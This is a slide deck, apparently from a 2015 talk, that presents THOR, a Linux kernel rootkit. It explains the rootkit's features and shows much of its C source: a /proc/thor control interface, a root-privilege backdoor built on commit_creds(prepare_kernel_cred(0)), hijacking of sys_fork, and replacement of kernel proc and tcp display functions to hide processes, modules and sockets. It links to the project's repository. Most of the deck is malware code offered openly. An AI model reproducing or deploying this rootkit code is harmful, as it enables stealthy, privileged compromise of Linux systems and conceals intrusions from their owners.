---
title: 'THOR'
subtitle: 'The ~~Horrific~~ Hopefully Omnipotent Rootkit'
author: [
    Alex Hirsch,
    FraJo Haider,
]
date: 2015-01-30
---

# Intro

## Features

- works with recent kernel
    - x86_64
    - ARM (BeagleBone Black)
- hide files by suffix (`__thor`)
- hide kernel modules
- hide processes
- hide sockets
- automatically handles forked processes
- hijack kernel functions
    - may not always work
    - *may lead to race conditions, kernel panics and other problems*

# Communication

## Usage

    usage:
       echo hp PID    > /proc/thor     (hides process PID)
       echo up PID    > /proc/thor     (unhides process PID)
       echo upa       > /proc/thor     (unhide all PIDs)
       echo hm MODULE > /proc/thor     (hide module)
       echo um MODULE > /proc/thor     (unhide module)
       echo uma       > /proc/thor     (unhide all modules)
       echo root      > /proc/thor     (gain root privileges)

# Gain Root Privileges

## `commit_creds()`

```{.c .numberLines}
    /* ... */

    } else if (strncmp(buffer, "root", MIN(4, count)) == 0) {

        commit_creds(prepare_kernel_cred(0));

    }
```

# Handling Forks

## Init and Cleanup

```{.c .numberLines}
static long (*sys_fork)(void);

int pidhider_init(void)
{
    /* ... */

    sys_fork = (void*) kallsyms_lookup_name("sys_fork");

    /* error handling */

    hijack(sys_fork, thor_fork);
}

void pidhider_cleanup(void)
{
    if (sys_fork != NULL) {
        unhijack(sys_fork);
    }
}
```

## `thor_fork()`

```{.c .numberLines}
static long thor_fork(void)
{
    bool hidden = is_pid_hidden(current->pid);
    long ret;

     unhijack(sys_fork);
     ret = sys_fork();
     hijack(sys_fork, thor_fork);

     /* if mother process was hidden child process */
     if(hidden && ret != -1 && ret != 0) {
         add_to_pid_list((unsigned short) ret);
     }

     return ret;
}
```

# Hijacking Explained (DEMO)

## Simpler method

Will be shown in the next part.

# Hiding Process

## Init

```{.c .numberLines}
int pidhider_init(void)
{
    /* ... */

    /* insert our modified iterate for /proc */
    procroot = procfile->parent;
    proc_fops = (struct file_operations*) procroot->proc_fops;

    /* store original iterate function */
    orig_proc_iterate = proc_fops->iterate;

    iterate_addr = (void*) &(thor_proc_iterate);
    write_no_prot(&proc_fops->iterate, &iterate_addr, sizeof(void*));

    /* ... */

    return 0;
}
```

## Cleanup

```{.c .numberLines}
void pidhider_cleanup(void)
{
    if (proc_fops != NULL && orig_proc_iterate != NULL) {
        void *iterate_addr = orig_proc_iterate;

        write_no_prot(&proc_fops->iterate, &iterate_addr, sizeof(void*));
    }

    /* ... */
}
```

## `thor_proc_iterate()`

```{.c .numberLines}
static int thor_proc_iterate(struct file *file, struct dir_context *ctx)
{
    int ret;
    filldir_t *ctx_actor;

    /* capture original filldir function */
    orig_proc_filldir = ctx->actor;

    /* cast away const from ctx->actor */
    ctx_actor = (filldir_t*) (&ctx->actor);

    /* store our filldir in ctx->actor */
    *ctx_actor = thor_proc_filldir;
    ret = orig_proc_iterate(file, ctx);

    /* restore original filldir */
    *ctx_actor = orig_proc_filldir;

    return ret;
}
```

## `thor_proc_filldir()`

```{.c .numberLines}
static int thor_proc_filldir(void *buf, const char *name, int namelen,
                             loff_t offset, u64 ino, unsigned d_type)
{

    /* ... */

    /* hide specified PIDs */
    list_for_each_entry(tmp, &(pid_list.list), list) {
        if (pid == tmp->pid) {
            return 0;
        }
    }

    /* hide thor itself */
    if (strcmp(name, THOR_PROCFILE) == 0) {
        return 0;
    }

    return orig_proc_filldir(buf, name, namelen, offset, ino, d_type);
}
```

# Hiding Kernel Modules

## -

similar to the previous one

# Hiding Files

## -

similar to the previous one

# Hiding Sockets

## Init and Cleanup

```{.c .numberLines}
typedef int (*seq_show_fun)(struct seq_file*, void*);

static seq_show_fun orig_tcp4_seq_show;

int sockethider_init(void)
{
    orig_tcp4_seq_show = replace_tcp_seq_show(thor_tcp4_seq_show,
                                              "/proc/net/tcp");

    /* ... */
}

void sockethider_cleanup(void)
{
    replace_tcp_seq_show(orig_tcp4_seq_show, "/proc/net/tcp");

    /* ... */
}
```

## `replace_tcp_seq_show()`

```{.c .numberLines}
static seq_show_fun replace_tcp_seq_show(seq_show_fun new_seq_show,
                                         const char *path)
{
    void *old_seq_show;
    struct file *filp;
    struct tcp_seq_afinfo *afinfo;

    if ((filp = filp_open(path, O_RDONLY, 0)) == NULL)
        return NULL;

    afinfo = PDE_DATA(filp->f_dentry->d_inode);

    old_seq_show = afinfo->seq_ops.show;

    afinfo->seq_ops.show = new_seq_show;

    filp_close(filp, 0);

    return old_seq_show;
}
```

## `thor_tcp4_seq_show()`

```{.c .numberLines}
static int thor_tcp4_seq_show(struct seq_file *seq, void *v)
{
    /* hide port */
    if (v != SEQ_START_TOKEN && is_socket_process_hidden(v))
        return 0;

    /* call original */
    return orig_tcp4_seq_show(seq, v);
}
```

# Outro

## Take a look

Github: <http://git.io/ZwNdCQ>

\centerline{\includegraphics[height=160px]{gfx/qrcode.png}}

# In Action (DEMO)
